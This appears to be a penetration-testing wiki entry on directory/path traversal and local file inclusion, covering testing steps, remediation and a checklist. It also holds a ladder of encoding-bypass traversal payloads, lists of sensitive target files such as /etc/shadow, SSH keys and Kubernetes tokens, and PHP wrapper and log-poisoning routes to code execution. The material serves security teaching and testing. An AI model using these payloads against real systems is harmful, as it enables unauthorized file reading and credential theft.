---
type: technique
title: Directory / Path Traversal
lang: en
status: active
wstg: ["WSTG-ATHZ-01"]
owasp_top10: ["A01:2021"]
owasp_api: []
asvs: ["V5.3.2"]
cwe: ["CWE-22"]
attack: []
cvss: ""
sources: [web-200-oswa, payloadsallthethings]
updated: 2026-09-17
---

# Directory / Path Traversal

**TL;DR** — When a parameter names a file or path and the app builds a filesystem path
from it without confining the result to a base directory, `../` sequences let you escape
and read (sometimes write) arbitrary files.

> Framework: **A01:2021 – Broken Access Control**, `CWE-22`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).

## Where it applies

Any input that becomes part of a file path: `download`, `file`, `path`, `page`,
`template`, `lang`, `image`, `doc`, `theme` — and file-serving endpoints. "Suggestive"
parameter names (things that look like filenames) are the first place to look.

## How it works

The app concatenates input into a path: `readFile("/var/www/files/" + input)`. Supplying
`../` walks up out of the intended directory:

- **Relative:** `../../../../etc/passwd` climbs from the app dir to filesystem root, then down.
- **Absolute:** if input is used as-is, `/etc/passwd` or `C:\Windows\win.ini` may work directly.

## Testing

1. Confirm the parameter reaches the filesystem (request a known file, watch the response).
2. Climb with enough `../` to be sure you reach root (over-climbing is harmless — root's
   parent is root), targeting a reliable file:

   ```
   ../../../../../../etc/passwd            # Linux
   ..\..\..\..\..\..\windows\win.ini       # Windows
   ```
3. **Defeat filters with encoding** when raw `../` is blocked:

   ```
   ..%2f..%2f..%2f..%2fetc%2fpasswd        # URL-encoded slash
   ..%252f..%252f...                       # double URL-encoded (decoded twice server-side)
   ....//....//....//etc/passwd            # nested — survives a single "strip ../" filter
   ```
   Legacy tricks: null byte `%00` to cut an appended extension; forced prefixes handled by
   climbing past them.
4. Watch for a fixed prefix/suffix (extension appended, base dir prepended) and adapt.
5. Automate breadth with a traversal wordlist via [[burp-suite|Burp]] Intruder or ffuf.

## Exploitation

Read high-value files: `/etc/passwd` (user enumeration), app config and source, framework
secrets, SSH keys, DB creds, logs. Read source to find further bugs; read config to pivot.
On misconfigured upload/write paths, traversal can also *write* files (→ web shell).

## From file read to RCE (LFI)

When the traversed path is *included/executed* rather than just read — classic PHP
`include($_GET['page'])` — traversal becomes **Local File Inclusion** and can reach code
execution:

- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php` to exfiltrate
  source; `data://text/plain;base64,<payload>` or `expect://id` to execute (when enabled).
- **Log poisoning:** plant PHP in a log the app will include (e.g. a crafted `User-Agent`
  in `access.log`), then include that log.
- **Session / proc:** include a session file you seeded (`/var/lib/php/sessions/sess_<id>`)
  or `/proc/self/environ` (older stacks).

Fuzz path parameters with [[ffuf]] / [[gobuster]]; build target-specific wordlists with
[[cewl]].

## Payload library

Inert; over-climb freely (root's parent is root). Fuller set: [[payloadsallthethings|PaTT]];
execution/wrappers on [[lfi]].

**Climb + encoding-bypass ladder** (escalate when raw `../` is filtered):

```text
../../../../../../etc/passwd                 # raw
..%2f..%2f..%2f..%2fetc%2fpasswd             # URL-encoded slash
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd      # fully URL-encoded
..%252f..%252f..%252fetc%252fpasswd          # double-encoded (decoded twice server-side)
....//....//....//etc/passwd                 # nested — survives one "strip ../" pass
..%c0%af..%c0%afetc/passwd                   # overlong UTF-8 slash
%uff0e%uff0e%u2215                            # unicode dot-dot-slash
..%00/etc/passwd     ..%0a/etc/passwd        # null / newline truncation of an appended suffix
..;/..;/..;/                                 # Nginx→Tomcat reverse-proxy traversal
```

**High-value files — Linux:**

```text
/etc/passwd  /etc/shadow  /etc/hosts  /etc/group  /etc/issue
/home/<user>/.ssh/id_rsa   /home/<user>/.bash_history
/proc/self/environ   /proc/self/cmdline   /proc/self/cwd/index.php   # app source w/o its path
/var/www/html/config.php   /var/log/apache2/access.log               # config / log-poison target ([[lfi]])
/run/secrets/kubernetes.io/serviceaccount/token
```

**High-value files — Windows:**

```text
C:\Windows\win.ini              C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config   C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Windows\repair\SAM           C:\Users\<user>\.ssh\id_rsa
\\localhost\c$\windows\win.ini  # UNC path — also leaks NetNTLM
```

## Worked example — Home Assistant

From [[web-200-oswa]]: after establishing traversal in the sandbox (absolute pathing to
exfiltrate `data.txt`, then relative pathing to reach `/etc/passwd`, including a
URL-encoded `..%2F..%2F…home%2F` bypass), the real-world case targets Home Assistant. A
path-handling request captured in [[burp-suite|Burp]] is vulnerable to traversal, and
walking to the application's **configuration file** discloses its contents — secrets that
enable further compromise.

## Confirming impact

Show retrieval of a file outside the web root (`/etc/passwd` or an app config with
secrets). Impact ranges from information disclosure to credential theft to RCE (if you can
read secrets/source or write into an executable path).

## Remediation

- Avoid user-controlled paths; map an **allowlisted identifier** to a server-side path
  instead of accepting a filename.
- **Canonicalise then verify** the resolved path is still inside the intended base dir
  (resolve `..`/symlinks first, then check the prefix).
- Least-privilege file permissions; disable directory listing; run the app as an
  unprivileged user.

## Quick checklist

- [ ] Any filename/path param (`file`,`page`,`path`,`download`,`template`,`lang`,`image`) or file-serving endpoint?
- [ ] Confirm a known file; climb to `/etc/passwd` (Linux) / `win.ini` (Windows).
- [ ] Filtered? → URL / double-URL / `....//` / overlong-UTF-8 / null-byte / `..;/`.
- [ ] Read source & config → secrets / further bugs. Included (executed), not just read? → [[lfi]] (→ RCE).

## See also

[[lfi]] · [[web-app-assessment]] · [[burp-suite]] · [[command-injection]]

*Sources: [[web-200-oswa]] module 10 (Home Assistant case study); [[payloadsallthethings]] (encoding-bypass ladder, target-file lists).*
